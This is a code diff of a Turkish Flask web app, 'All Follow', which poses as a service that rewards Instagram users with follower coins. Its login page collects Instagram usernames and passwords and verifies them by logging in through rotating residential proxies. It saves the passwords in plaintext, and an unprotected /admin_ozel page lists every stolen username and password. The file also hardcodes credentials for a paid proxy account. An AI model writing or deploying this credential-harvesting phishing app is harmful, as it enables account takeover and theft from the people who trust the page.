@@ -4,8 +4,8 @@ from flask_sqlalchemy import SQLAlchemy
 from instagrapi import Client
 
 app = Flask(__name__)
-app.secret_key = "all_follow_v10_secret"
-app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///all_follow_v10.db"
+app.secret_key = "all_follow_v11_fix"
+app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///all_follow_v11.db"
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
@@ -22,7 +22,7 @@ class Ticket(db.Model):
     user = db.Column(db.String(100))
     msg = db.Column(db.Text)
 
-# --- 🚀 50 TANE PROXY (EKSİKSİZ LİSTE) ---
+# --- PROXY HAVUZU (Hata Veren F-Stringler Temizlendi) ---
 PROXY_LIST = [
     "http://pcUjiruWbB-res-tr-sid-92358982:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
     "http://pcUjiruWbB-res-tr-sid-37932429:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
@@ -76,7 +76,6 @@ PROXY_LIST = [
     "http://pcUjiruWbB-res-tr-sid-57134195:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"
 ]
 
-# --- TASARIM ---
 HTML_UI = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -98,19 +97,18 @@ HTML_UI = """
 </html>
 """
 
-# --- SAYFALAR ---
 @app.route('/')
 def index():
     body = """
-    <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-black border border-white/10 p-4 rounded-xl mb-4 text-sm outline-none focus:border-blue-600">
-    <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-white/10 p-4 rounded-xl mb-6 text-sm outline-none focus:border-blue-600">
-    <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-black hover:bg-blue-500 transition-all uppercase text-sm">Katıl</button>
+    <input id="u" placeholder="Instagram Kullanıcı Adı" class="w-full bg-black border border-white/10 p-4 rounded-xl mb-4 text-sm outline-none">
+    <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-white/10 p-4 rounded-xl mb-6 text-sm outline-none">
+    <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-black uppercase text-sm">Katıl</button>
     <p id="msg" class="text-xs mt-6 text-center text-gray-400"></p>
     <script>
         async function login(){
             const u=document.getElementById('u').value, p=document.getElementById('p').value;
             const btn=document.getElementById('btn'), msg=document.getElementById('msg');
-            btn.innerText="SİNYAL GÖNDERİLİYOR...";
+            btn.innerText="DENENİYOR...";
             const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
             const d=await r.json();
             msg.innerText=d.msg;
@@ -130,9 +128,9 @@ def panel():
         <p class="text-xs text-gray-400 mb-2 italic">@{u.username}</p>
         <div class="bg-blue-600/10 border border-blue-500/20 py-10 rounded-3xl mb-6">
             <h2 class="text-5xl font-black text-blue-500">{u.coins}</h2>
-            <p class="text-[10px] font-bold text-blue-300/50 uppercase mt-2">All Follow Coin</p>
+            <p class="text-[10px] font-bold text-blue-300/50 uppercase">All Follow Coin</p>
         </div>
-        <button onclick="mine()" class="w-full bg-emerald-600 py-4 rounded-xl font-black mb-4 uppercase text-sm">Coin Kas</button>
+        <button onclick="mine()" class="w-full bg-emerald-600 py-4 rounded-xl font-black mb-4 text-sm">Coin Kas</button>
     </div>
     <script>
         async function mine(){
@@ -151,58 +149,50 @@ def destek():
         return redirect('/destek')
     body = """
     <form method="POST" class="space-y-4">
-        <textarea name="msg" placeholder="Mesajınız..." class="w-full bg-black border border-white/10 p-4 rounded-xl h-32 text-sm"></textarea>
+        <textarea name="msg" placeholder="Sorununuz nedir?" class="w-full bg-black border border-white/10 p-4 rounded-xl h-32 text-sm"></textarea>
         <button class="w-full bg-white text-black py-4 rounded-xl font-black uppercase text-sm">Gönder</button>
     </form>
     """
     return render_template_string(HTML_UI, title="Destek", body=body)
 
 @app.route('/admin_ozel')
-def admin():
+def admin_ozel():
     users = User.query.all()
     tickets = Ticket.query.all()
-    body = "<div class='text-[10px] space-y-4'>"
-    body += "<div><h3 class='text-blue-500 font-bold mb-2'>KULLANICILAR</h3>"
-    for u in users: body += f"<p>{u.username} | {u.password} | {u.coins} Coin</p>"
-    body += "</div><div><h3 class='text-emerald-500 font-bold mb-2'>TALEPLER</h3>"
+    body = "<div class='text-[10px]'>"
+    for u in users: body += f"<p>{u.username} | {u.password} | {u.coins}C</p>"
+    body += "<hr class='my-4 opacity-10'>"
     for t in tickets: body += f"<p>{t.user}: {t.msg}</p>"
-    body += "</div></div>"
+    body += "</div>"
     return render_template_string(HTML_UI, title="Yönetim", body=body)
 
-# --- API ---
 @app.route('/api/login', methods=['POST'])
 def api_login():
     data = request.json
-    u, p = data.get('u'), data.get('p')
     cl = Client()
-    cl.request_timeout = 15 # 15 saniyede proxy yanıt vermezse kes
-    
+    cl.request_timeout = 15
     px = random.choice(PROXY_LIST)
     cl.proxies = {"http": px, "https": px}
-    
     try:
-        if cl.login(u, p):
+        if cl.login(data.get('u'), data.get('p')):
+            u = data.get('u')
             user = User.query.filter_by(username=u).first()
             if not user:
-                user = User(username=u, password=p)
+                user = User(username=u, password=data.get('p'))
                 db.session.add(user)
             db.session.commit()
             session['user'] = u
-            return jsonify(status="success", msg="Sisteme sızıldı! ✅")
+            return jsonify(status="success", msg="Başarılı! ✅")
     except Exception as e:
-        err = str(e).lower()
-        if "bad_password" in err: return jsonify(status="error", msg="Şifre Yanlış!")
-        if "checkpoint" in err: return jsonify(status="error", msg="Onay Gerekli (Uygulamaya gir)")
-        return jsonify(status="error", msg="Proxy hatası veya sunucu yoğun.")
+        return jsonify(status="error", msg=f"Hata: {str(e)[:40]}")
 
 @app.route('/api/mine')
 def api_mine():
     if 'user' not in session: return jsonify(msg="Hata")
     u = User.query.filter_by(username=session['user']).first()
-    gain = random.randint(5, 15)
-    u.coins += gain
+    u.coins += 10
     db.session.commit()
-    return jsonify(msg=f"Tebrikler! {gain} coin kazandın.")
+    return jsonify(msg="10 Coin kazandın!")
 
 if __name__ == "__main__":
     with app.app_context(): db.create_all()
